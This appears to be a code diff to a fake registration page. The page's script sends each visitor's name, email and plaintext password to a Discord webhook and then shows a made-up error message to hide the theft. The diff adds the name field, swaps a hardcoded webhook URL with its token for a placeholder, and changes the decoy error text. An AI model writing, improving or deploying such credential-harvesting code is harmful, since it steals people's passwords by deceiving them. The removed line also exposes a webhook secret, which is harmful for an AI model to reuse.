@@ -57,6 +57,10 @@
         <h2>Register</h2>
         <form id="registerForm">
             <div class="form-group">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" required>
             </div>
@@ -71,10 +75,11 @@
         document.getElementById('registerForm').addEventListener('submit', function(e) {
             e.preventDefault(); // Prevent form from submitting normally
             
+            var name = document.getElementById('name').value;
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
             
-            var webhookUrl = 'https://discord.com/api/webhooks/1195746273773506720/zI3DfyDqjTiDboz-5b_fNJA79ea_N4_Ta5kzpLqPEe4vfQ_xXdFZnBOU3hINYT6bOTPO';
+            var webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
             
             var request = new XMLHttpRequest();
             request.open('POST', webhookUrl);
@@ -82,12 +87,12 @@
             
             var params = {
                 username: 'Registration Bot',
-                content: `Email: ${email}\nPassword: ${password}`
+                content: `Name: ${name}\nEmail: ${email}\nPassword: ${password}`
             };
             
             request.send(JSON.stringify(params));
             
-            alert('Error crating a new account Error code: 31');
+            alert('Error please report this to the site owner: 532');
         });
     </script>
 </body>
